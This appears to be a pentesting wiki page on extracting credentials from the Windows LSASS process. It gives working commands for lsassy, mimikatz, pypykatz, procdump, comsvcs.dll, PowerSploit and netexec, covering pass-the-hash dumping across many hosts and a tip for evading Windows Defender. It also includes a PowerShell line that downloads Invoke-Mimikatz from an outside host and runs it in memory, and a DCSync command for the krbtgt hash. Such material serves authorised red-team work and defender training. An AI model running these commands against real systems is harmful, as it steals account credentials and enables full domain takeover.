## Theory
The Local Security Authority Subsystem Service (LSASS) is a Windows service responsible for enforcing the security policy on the system. It verifies users logging in, handles password changes and creates access tokens. Those operations lead to the storage of credential material in the process memory of LSASS. With administrative rights only, this material can be harvested (either locally or remotely).
## lsass dumping
=== "lsassy"
    [Lsassy](https://github.com/login-securite/lsassy) (Python) can be used to remotely extract credentials, from LSASS, on multiple hosts.

    - several dumping methods: comsvcs.dll, ProcDump, Dumpert
    - several authentication methods: like pass-the-hash (NTLM), or pass-the-ticket (Kerberos)
    - it can be used either as a standalone script, as a NetExec module or as a Python library
    - it can interact with a Neo4j database to set BloodHound targets as "owned"
    ```bash
    # With pass-the-hash (NTLM)
    lsassy -u $USER -H $NThash $TARGETS

    # With plaintext credentials
    lsassy -d $DOMAIN -u $USER -H $NThash $TARGETS

    # With pass-the-ticket (Kerberos)
    lsassy -k $TARGETS

    # netexec Module examples
    netexec smb $TARGETS -d $DOMAIN -u $USER -H $NThash -M lsassy
    netexec smb $TARGETS -d $DOMAIN -u $USER -H $NThash -M lsassy -o BLOODHOUND=True NEO4JUSER=neo4j NEO4JPASS=Somepassw0rd
    netexec smb $TARGETS -k -M lsassy
    netexec smb $TARGETS -k -M lsassy -o BLOODHOUND=True NEO4JUSER=neo4j NEO4JPASS=Somepassw0rd
    ```
=== "mimikatz"
    [mimikatz](https://github.com/ParrotSec/mimikatz) can be used locally to extract credentials with `sekurlsa::logonpasswords` from lsass's process memory, or remotely with `sekurlsa::minidump` to analyze a memory dump (dumped with ProcDump)
    ```bash
    # (Locally) extract credentials from LSASS process memory
    sekurlsa::logonpasswords

    # (Remotely) analyze a memory dump
    sekurlsa::minidump lsass.dmp
    sekurlsa::logonpasswords
    ```
=== "pypykatz"
    [pypykatz](https://github.com/skelsec/pypykatz) (Python) can be used remotely (i.e. offline) to analyze a memory dump (dumped with ProcDump for example).
    ```bash
    pypykatz lsa minidump lsass.dmp
    ```
=== "procdump"
    [procdump](https://learn.microsoft.com/en-us/sysinternals/downloads/procdump) from sysinternal can be used to dump lsass's memory
    ```bash
    procdump -accepteula -ma lsass lsass.dmp
    ```
    !!! note
        Windows Defender is triggered when a memory dump of lsass is operated, quickly leading to the deletion of the dump. Using lsass's process identifier (pid) "bypasses" that.
    ```bash
    # Find lsass's pid
    tasklist /fi "imagename eq lsass.exe"

    # Dump lsass's process memory
    procdump -accepteula -ma $lsass_pid lsass.dmp
    ```
    Once the memory dump is finished, it can be analyzed with mimikatz (Windows) or pypykatz (Python, cross-platform).
=== "comsvcs.dll"
    The native comsvcs.dll DLL found in C:\Windows\system32 can be used with rundll32 to dump LSASS's process memory.
    ```bash
    # Find lsass's pid
    tasklist /fi "imagename eq lsass.exe"

    # Dump lsass's process memory
    rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsass_pid C:\temp\lsass.dmp full
    ```
=== "powersploit"
    [PowerSploit](https://github.com/PowerShellMafia/PowerSploit)'s exfiltration script Invoke-Mimikatz (PowerShell) can be used to extract credential material from LSASS's process memory.
    ```bash
    powershell IEX (New-Object System.Net.Webclient).DownloadString('http://10.0.0.5/Invoke-Mimikatz.ps1') ; Invoke-Mimikatz -DumpCreds
    ```
=== "netexec"
    netexec also has some modules can be used for dumping lsass

    - Using `lsassy`
    ```bash
    nxc smb 192.168.255.131 -u administrator -p pass -M lsassy
    ```
    - Using nanodump
    ```bash
    nxc smb 192.168.255.131 -u administrator -p pass -M nanodump
    ```
    - Using mimikatz (deprecated)
    ```bash
    nxc smb 192.168.255.131 -u administrator -p pass -M mimikatz
    ```
    ```bash
    nxc smb 192.168.255.131 -u Administrator -p pass -M mimikatz -o COMMAND='"lsadump::dcsync /domain:domain.local /user:krbtgt"
    ```
    !!! warning
        at least local admin privilege on the remote target, use option `--local-auth` if user is a local account